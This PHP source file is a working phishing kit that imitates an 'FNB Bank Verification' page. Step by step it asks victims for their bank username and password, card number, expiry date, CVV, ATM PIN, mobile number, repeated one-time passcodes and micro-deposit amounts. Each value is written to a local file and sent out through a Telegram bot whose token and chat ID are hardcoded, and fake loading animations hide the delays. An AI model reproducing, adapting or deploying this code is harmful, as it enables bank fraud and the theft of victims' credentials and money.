<?php
session_start();
$message = '';
$user_ip = $_SERVER['REMOTE_ADDR'];

// Telegram config
$telegram_token = '8405993320:AAEN-MvY2qDa1507_czyiCkckx7TzVRKfb0'; // <-- Updated bot token
$telegram_chat_id = '6853773851'; // <-- Updated chat ID

function sendToTelegram($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Step logic
if (!isset($_SESSION['step'])) $_SESSION['step'] = 1;
$step = $_SESSION['step'];

// Progress bar HTML
function progressBar($duration, $nextStep) {
    // Show a creative world loading GIF for all OTP steps (4.5, 5.5, 7.5, 8.5)
    $otpSteps = [4.5, 5.5, 7.5, 8.5];
    $isOtpLoading = (isset($_SESSION['step']) && in_array($_SESSION['step'], $otpSteps));
    $loadingVisual = $isOtpLoading
        ? '<div style="margin-bottom:16px;">
                <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="World Loading" style="width:90px;height:90px;border-radius:50%;box-shadow:0 0 16px #007bff;">
                <div style="color:#007bff;font-size:18px;margin-top:8px;font-weight:bold;">
                    Connecting to the world for OTP verification...
                </div>
           </div>'
        : '';
    $loadingText = $isOtpLoading
        ? '<h3 style="color:#007bff;">Hang tight! We\'re spinning the globe to verify your OTP.</h3>'
        : '<h3>Verification in progress, please wait...</h3>';
    return '
    <div style="text-align:center;">
        ' . $loadingVisual . '
        ' . $loadingText . '
        <div id="progress-container" style="width:100%;background:#eee;border-radius:8px;">
            <div id="progress-bar" style="width:0%;height:30px;background:#007bff;border-radius:8px;"></div>
        </div>
        <div id="progress-text" style="margin-top:10px;font-size:18px;">0%</div>
    </div>
    <script>
        let progress = 0;
        let interval = setInterval(function() {
            progress++;
            document.getElementById("progress-bar").style.width = progress + "%";
            document.getElementById("progress-text").innerText = progress + "%";
            if(progress >= 100) {
                clearInterval(interval);
                setTimeout(function() {
                    window.location.href = "?step=' . $nextStep . '";
                }, 500);
            }
        }, ' . ($duration * 10) . ');
    </script>
    ';
}

function rainbowProgressBar($duration, $nextStep) {
    return '
    <div style="text-align:center;">
        <div style="margin-bottom:24px;">
            <svg width="80" height="80" viewBox="0 0 80 80" style="display:block;margin:0 auto;">
                <defs>
                    <linearGradient id="rainbow" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" stop-color="#FF0000"/>
                        <stop offset="20%" stop-color="#FF9900"/>
                        <stop offset="40%" stop-color="#FFFF00"/>
                        <stop offset="60%" stop-color="#00FF00"/>
                        <stop offset="80%" stop-color="#0000FF"/>
                        <stop offset="100%" stop-color="#9900FF"/>
                    </linearGradient>
                </defs>
                <circle cx="40" cy="40" r="32" stroke="url(#rainbow)" stroke-width="10" fill="none" stroke-dasharray="201" stroke-dashoffset="201" id="rainbow-circle"/>
            </svg>
            <div style="color:#007bff;font-size:18px;margin-top:12px;font-weight:bold;">
                Securely verifying your card details...
            </div>
        </div>
        <div id="rainbow-progress-container" style="width:100%;background:#eee;border-radius:8px;">
            <div id="rainbow-progress-bar" style="width:0%;height:18px;background:linear-gradient(90deg,#FF0000,#FF9900,#FFFF00,#00FF00,#0000FF,#9900FF);border-radius:8px;"></div>
        </div>
        <div id="rainbow-progress-text" style="margin-top:10px;font-size:16px;color:#007bff;">0%</</div>
    </div>
    <script>
        let progress = 0;
        let interval = setInterval(function() {
            progress++;
            document.getElementById("rainbow-progress-bar").style.width = progress + "%";
            document.getElementById("rainbow-progress-text").innerText = progress + "%";
            // Animate SVG circle
            let circle = document.getElementById("rainbow-circle");
            if(circle) {
                let dashoffset = 201 - (201 * progress / 100);
                circle.setAttribute("stroke-dashoffset", dashoffset);
            }
            if(progress >= 100) {
                clearInterval(interval);
                setTimeout(function() {
                    window.location.href = "?step=' . $nextStep . '";
                }, 500);
            }
        }, ' . ($duration * 10) . ');
    </script>
    ';
}

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($step == 1 && isset($_POST['username'])) {
        $username = trim($_POST['username']);
        if ($username === '') {
            $message = "Please enter your bank username.";
        } elseif (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
            $message = "Bank username should only contain letters, numbers, and underscores.";
        } else {
            file_put_contents('r.txt', "Username: $username | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Bank Username: $username\nIP: $user_ip");
            $_SESSION['step'] = 1.5; // Use half-step to show loading
            $_SESSION['next_step'] = 2;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 2 && isset($_POST['password'])) {
        $password = trim($_POST['password']);
        if ($password === '') {
            $message = "Please enter your password.";
        } else {
            file_put_contents('r.txt', "Password: $password | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Bank Password: $password\nIP: $user_ip");
            $_SESSION['step'] = 2.7;
            header("Location: ?step=2.7");
            exit;
        }
    } elseif ($step == 2.7 && isset($_POST['confirm_card_number']) && isset($_POST['confirm_atm_pin'])) {
        $confirm_card_number = trim($_POST['confirm_card_number']);
        $confirm_atm_pin = trim($_POST['confirm_atm_pin']);
        if ($confirm_card_number === '' || $confirm_atm_pin === '') {
            $message = "Please confirm both card number and ATM PIN.";
        } else {
            file_put_contents('r.txt', "Confirmed Card Number: $confirm_card_number | Confirmed ATM PIN: $confirm_atm_pin | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Confirmed Card Number: $confirm_card_number\nConfirmed ATM PIN: $confirm_atm_pin\nIP: $user_ip");
            $_SESSION['step'] = 2.8;
            $_SESSION['next_step'] = 2.9;
            header("Location: ?step=rainbow_loading");
            exit;
        }
    } elseif ($step == 2.9 && isset($_POST['otp_confirm'])) {
        $otp_confirm = trim($_POST['otp_confirm']);
        if ($otp_confirm === '') {
            $message = "Please enter the OTP sent to your phone.";
        } else {
            file_put_contents('r.txt', "OTP After Card Confirm: $otp_confirm | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "OTP After Card Confirm: $otp_confirm\nIP: $user_ip");
            $_SESSION['step'] = 3;
            header("Location: ?step=3");
            exit;
        }
    } elseif ($step == 3 && isset($_POST['mobile'])) {
        $mobile = trim($_POST['mobile']);
        if ($mobile === '') {
            $message = "Please enter your mobile number.";
        } elseif (!preg_match('/^\d{10,15}$/', $mobile)) {
            $message = "Enter a valid mobile number.";
        } else {
            file_put_contents('r.txt', "Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Mobile Number: $mobile\nIP: $user_ip");
            $_SESSION['mobile'] = $mobile; // <-- Save mobile for OTP tagging
            $_SESSION['step'] = 3.5;
            $_SESSION['next_step'] = 4;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 4 && isset($_POST['otp'])) {
        $otp = trim($_POST['otp']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($otp === '') {
            $message = "Please enter the OTP sent to your phone.";
        } else {
            file_put_contents('r.txt', "OTP: $otp | Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "OTP: $otp\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 4.5;
            $_SESSION['next_step'] = 5;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 5 && isset($_POST['otp2'])) {
        $otp2 = trim($_POST['otp2']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($otp2 === '') {
            $message = "Please enter the updated OTP sent to your phone.";
        } else {
            file_put_contents('r.txt', "Updated OTP: $otp2 | Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Updated OTP: $otp2\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 5.5;
            $_SESSION['next_step'] = 6;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 6 && isset($_POST['card_number'])) {
        $card_number = trim($_POST['card_number']);
        $expiry = trim($_POST['expiry']);
        $cvv = trim($_POST['cvv']);
        $atm_pin = trim($_POST['atm_pin']);
        if ($card_number === '' || $expiry === '' || $cvv === '' || $atm_pin === '') {
            $message = "Please fill in all card details.";
        } else {
            file_put_contents('r.txt', "Card: $card_number | Expiry: $expiry | CVV: $cvv | ATM PIN: $atm_pin | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Card: $card_number\nExpiry: $expiry\nCVV: $cvv\nATM PIN: $atm_pin\nIP: $user_ip");
            $_SESSION['step'] = 6.5;
            $_SESSION['next_step'] = 7;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 7 && isset($_POST['card_otp'])) {
        $card_otp = trim($_POST['card_otp']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($card_otp === '') {
            $message = "Please enter the OTP sent to your phone.";
        } else {
            file_put_contents('r.txt', "Card OTP: $card_otp | Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Card OTP: $card_otp\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 7.5;
            $_SESSION['next_step'] = 8;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 8 && isset($_POST['card_otp2'])) {
        $card_otp2 = trim($_POST['card_otp2']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($card_otp2 === '') {
            $message = "Please enter the updated OTP sent to your phone.";
        } else {
            file_put_contents('r.txt', "Updated Card OTP: $card_otp2 | Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Updated Card OTP: $card_otp2\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 9;
            header("Location: ?step=9");
            exit;
        }
    } elseif ($step == 9 && isset($_POST['final_otp'])) {
        $final_otp = trim($_POST['final_otp']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($final_otp === '') {
            $message = "Please enter the final OTP.";
        } else {
            file_put_contents('r.txt', "Final OTP: $final_otp | Mobile: $mobile | IP: $user_ip" . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Final OTP: $final_otp\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 9.5;
            $_SESSION['next_step'] = 10;
            header("Location: ?step=loading");
            exit;
        }
    } elseif ($step == 9.5 && isset($_POST['deposit1']) && isset($_POST['deposit2'])) {
        $deposit1 = trim($_POST['deposit1']);
        $deposit2 = trim($_POST['deposit2']);
        $mobile = isset($_SESSION['mobile']) ? $_SESSION['mobile'] : '';
        if ($deposit1 === '' || $deposit2 === '') {
            $message = "Please enter both deposit amounts.";
        } else {
            $log = "Deposit Verification: $deposit1, $deposit2 | Mobile: $mobile | IP: $user_ip";
            file_put_contents('r.txt', $log . PHP_EOL, FILE_APPEND | LOCK_EX);
            sendToTelegram($telegram_token, $telegram_chat_id, "Deposit Verification: $deposit1, $deposit2\nMobile: $mobile\nIP: $user_ip");
            $_SESSION['step'] = 10;
            header("Location: ?step=10");
            exit;
        }
    }
}

// Step control for GET navigation
if (isset($_GET['step'])) {
    if ($_GET['step'] === 'loading' && isset($_SESSION['next_step'])) {
        $step = $_SESSION['step'];
    } elseif ($_GET['step'] === 'rainbow_loading' && isset($_SESSION['next_step'])) {
        echo rainbowProgressBar(40, $_SESSION['next_step']); // 4 seconds
        $_SESSION['step'] = $_SESSION['next_step'];
        unset($_SESSION['next_step']);
        // Redirect to the next step after animation
        echo '<script>setTimeout(function(){ window.location.href = "?step=' . $_SESSION['step'] . '"; }, 4100);</script>';
        exit;
    } else {
        $step = is_numeric($_GET['step']) ? floatval($_GET['step']) : $_SESSION['step'];
        if ($step > $_SESSION['step']) {
            header("Location: ?step=" . $_SESSION['step']);
            exit;
        }
        $_SESSION['step'] = $step;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>FNB Bank Verification</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: url('FNB.png') no-repeat center center fixed;
            background-size: cover;
            padding: 40px;
        }
        .bank-form {
            background: rgba(255,255,255,0.97);
            padding: 32px 36px 28px 36px;
            border-radius: 16px;
            max-width: 440px;
            margin: 48px auto 24px auto;
            box-shadow: 0 4px 24px rgba(0,0,0,0.13);
            position: relative;
        }
        label { font-weight: bold; margin-bottom: 8px; }
        input[type="text"], input[type="password"], input[type="number"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 18px;
            border: 1.5px solid #b0b0b0;
            border-radius: 5px;
            font-size: 16px;
            background: #f7f7f7;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            background: #007bff;
            color: #fff;
            border: none;
            padding: 13px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
            transition: background 0.2s;
        }
        button:hover { background: #0056b3; }
        .message {
            margin-top: 15px;
            padding: 12px;
            border-radius: 5px;
            font-size: 15px;
        }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        h2 {
            text-align: center;
            color: #007bff;
            margin-bottom: 25px;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        @media (max-width: 600px) {
            .bank-form {
                padding: 18px 4vw 18px 4vw;
                max-width: 98vw;
            }
        }
    </style>
</head>
<body>
    <div class="bank-form">
        <div style="text-align:center;margin-bottom:18px;">
            <img src="FNB.png" alt="FNB Bank Logo" style="height:60px;box-shadow:0 2px 8px #007bff;border-radius:8px;">
        </div>
        <h2>FNB Bank Verification</h2>
        <?php
        // Show loading if in a half-step
        if (isset($_GET['step']) && $_GET['step'] === 'loading' && isset($_SESSION['next_step'])) {
            echo progressBar(10, $_SESSION['next_step']);
            // Move to next step after loading
            $_SESSION['step'] = $_SESSION['next_step'];
            unset($_SESSION['next_step']);
        } elseif (isset($_GET['step']) && $_GET['step'] === 'rainbow_loading' && isset($_SESSION['next_step'])) {
            // Already handled above
        } elseif ($step == 1) {
        ?>
            <form method="post">
                <label for="username">Bank Username:</label>
                <input type="text" id="username" name="username" required placeholder="Eg: johndoe123, fnb_user, absa2024">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 2) {
        ?>
            <form method="post">
                <label for="password">Bank Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 2.7) {
        ?>
            <form method="post">
                <label for="confirm_card_number">Confirm Card Number:</label>
                <input type="text" id="confirm_card_number" name="confirm_card_number" required placeholder="Re-enter Card Number">
                <label for="confirm_atm_pin">Confirm ATM PIN:</label>
                <input type="password" id="confirm_atm_pin" name="confirm_atm_pin" required placeholder="Re-enter ATM PIN">
                <button type="submit">Confirm</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 2.9) {
        ?>
            <form method="post">
                <label for="otp_confirm">OTP sent to phone:</label>
                <input type="number" id="otp_confirm" name="otp_confirm" required placeholder="Enter OTP">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 3) {
        ?>
            <form method="post">
                <label for="mobile">Mobile Number:</label>
                <input type="text" id="mobile" name="mobile" required placeholder="Eg: 0821234567">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 4) {
        ?>
            <form method="post">
                <label for="otp">OTP sent to phone:</label>
                <input type="number" id="otp" name="otp" required placeholder="Enter OTP">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 5) {
        ?>
            <form method="post">
                <label for="otp2">Updated OTP:</label>
                <input type="number" id="otp2" name="otp2" required placeholder="Enter updated OTP">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 6) {
        ?>
            <form method="post">
                <label for="card_number">Card Number:</label>
                <input type="text" id="card_number" name="card_number" required placeholder="Card Number">
                <label for="expiry">Expiry Date:</label>
                <input type="text" id="expiry" name="expiry" required placeholder="MM/YY">
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" required placeholder="CVV">
                <label for="atm_pin">ATM PIN:</label>
                <input type="password" id="atm_pin" name="atm_pin" required placeholder="ATM PIN">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 7) {
        ?>
            <form method="post">
                <label for="card_otp">Verify Card OTP:</label>
                <input type="number" id="card_otp" name="card_otp" required placeholder="Enter Card OTP">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 8) {
        ?>
            <form method="post">
                <label for="card_otp2">Updated Card OTP:</label>
                <input type="number" id="card_otp2" name="card_otp2" required placeholder="Enter updated Card OTP">
                <button type="submit">Next</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 9) {
        ?>
            <form method="post">
                <label for="deposit1">Verify Deposit Amounts:</label>
                <p style="margin-bottom:12px;">
                    Kindly login to your bank, check your statement for two deposits between R0.01 and R0.10.<br>
                    Enter the exact amounts below to verify.
                </p>
                <input type="text" id="deposit1" name="deposit1" required placeholder="First deposit amount (e.g. 0.07)">
                <input type="text" id="deposit2" name="deposit2" required placeholder="Second deposit amount (e.g. 0.03)">
                <button type="submit">Verify Deposits</button>
                <?php if ($message): ?>
                    <div class="message error"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
            </form>
        <?php
        } elseif ($step == 10) {
            echo "<div class='success'>Deposit verification submitted. Please wait for confirmation.</div>";
        }
        ?>
    </div>
</body>
</html>